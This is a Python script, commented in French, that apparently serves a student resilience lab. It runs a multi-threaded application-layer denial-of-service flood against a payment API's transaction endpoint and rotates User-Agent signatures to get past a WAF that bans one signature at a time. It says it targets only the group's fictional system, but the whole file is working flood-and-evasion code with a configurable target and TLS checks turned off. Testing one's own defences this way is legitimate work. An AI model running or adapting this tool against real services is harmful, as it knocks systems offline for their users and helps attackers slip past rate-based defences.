#!/usr/bin/env python3
"""DoS applicatif sur payment-api, variante à signature TOURNANTE (scénario de démo).

Même principe que dos_attack.py (flood POST /api/pay/transactions, jeton bidon), mais
chaque thread utilise un User-Agent tiré d'un pool, pas une signature fixe. Objectif :
démontrer la limite de la remédiation actuelle, qui bannit UNE seule signature (le plus
gros émetteur observé dans les logs WAF, cf. services/remediator/app/signature.py). Un
attaquant qui fait varier sa signature répartit le volume sur plusieurs UA : chacun peut
rester sous le seuil de "top émetteur", ou le ban successif de chacun n'arrête jamais le
flot global tant que le pool est assez large.

Le détecteur ML, lui, n'observe PAS le User-Agent : il mesure les métriques de
payment-api (req_rate, latence, erreurs...). Il devrait donc toujours déclencher une
alerte "availability_dos" — mais la remédiation qui en découle (ban d'UNE signature)
peut se révéler insuffisante. C'est exactement ce que ce script permet de vérifier.

Périmètre : UNIQUEMENT le SI fictif du groupe (point d'accès RESILIENCE-G12). Jamais le
réseau du campus ni une cible tierce.

Stdlib seulement : tourne dans python:3.12-slim sans dépendance.
    python dos_attack_rotating_ua.py --target https://waf:8443 --duration 45 --concurrency 60
    python dos_attack_rotating_ua.py --rotate-per-request   # change même en cours de thread
"""
import argparse
import random
import ssl
import threading
import time
import urllib.error
import urllib.request

STOP = threading.Event()
LOCK = threading.Lock()
# Répartition des réponses observées, PAR signature : utile pour voir si la remédiation
# arrive à suivre un pool de signatures plutôt qu'une seule.
STATS: dict[str, dict[str, int]] = {}

# Pool par défaut : signatures "ResilienceDoS/x.y" numérotées, pour rester identifiables
# dans les logs (démo pédagogique, pas une usurpation de vrais navigateurs).
DEFAULT_POOL = [f"ResilienceDoS/{i}.0" for i in range(1, 21)]


def classify(code: int | None) -> str:
    if code == 403:
        return "403"
    if code == 401:
        return "401"
    if code is not None and 200 <= code < 300:
        return "2xx"
    if code is None:
        return "erreur"
    return "autres"


def record(ua: str, bucket: str) -> None:
    with LOCK:
        STATS.setdefault(ua, {"403": 0, "401": 0, "2xx": 0, "autres": 0, "erreur": 0})
        STATS[ua][bucket] += 1


def send(url: str, user_agent: str, ctx: ssl.SSLContext) -> int | None:
    req = urllib.request.Request(
        url, data=b'{"dst":2,"amount":1}', method="POST",
        headers={"Content-Type": "application/json",
                 "Authorization": "Bearer flood-no-valid-token", "User-Agent": user_agent})
    try:
        return urllib.request.urlopen(req, timeout=5, context=ctx).status
    except urllib.error.HTTPError as e:
        return e.code  # 401 (jeton rejeté), 403 (banni par le WAF), etc.
    except Exception:
        return None  # timeout / connexion refusée : service sous pression


def worker(url: str, pool: list[str], ctx: ssl.SSLContext, rotate_per_request: bool) -> None:
    ua = random.choice(pool)  # signature fixe pour ce thread, sauf si rotation par requête
    while not STOP.is_set():
        current = random.choice(pool) if rotate_per_request else ua
        record(current, classify(send(url, current, ctx)))


def main() -> None:
    p = argparse.ArgumentParser(description="DoS applicatif de démo, signature tournante (SI fictif uniquement)")
    p.add_argument("--target", default="https://waf:8443")
    p.add_argument("--duration", type=int, default=45)
    p.add_argument("--concurrency", type=int, default=60)
    p.add_argument("--pool-size", type=int, default=20, help="nombre de signatures distinctes dans le pool")
    p.add_argument("--rotate-per-request", action="store_true",
                   help="change de signature à CHAQUE requête (pas seulement par thread)")
    args = p.parse_args()

    url = f"{args.target}/api/pay/transactions"
    pool = DEFAULT_POOL[: max(1, args.pool_size)]
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    print(f"[attack] cible {url} | {args.concurrency} threads | {args.duration}s | "
          f"pool={len(pool)} UA | rotation={'par requête' if args.rotate_per_request else 'par thread'}")

    threads = [threading.Thread(target=worker, args=(url, pool, ctx, args.rotate_per_request), daemon=True)
               for _ in range(args.concurrency)]
    for t in threads:
        t.start()

    time.sleep(args.duration)
    STOP.set()
    time.sleep(1)

    print("[attack] terminé — répartition par signature :")
    for ua, s in sorted(STATS.items(), key=lambda kv: -sum(kv[1].values())):
        total = sum(s.values())
        print(f"  {ua:<20} {total:>5} req | 403: {s['403']} | 401: {s['401']} | "
              f"2xx: {s['2xx']} | autres: {s['autres']} | erreurs: {s['erreur']}")


if __name__ == "__main__":
    main()
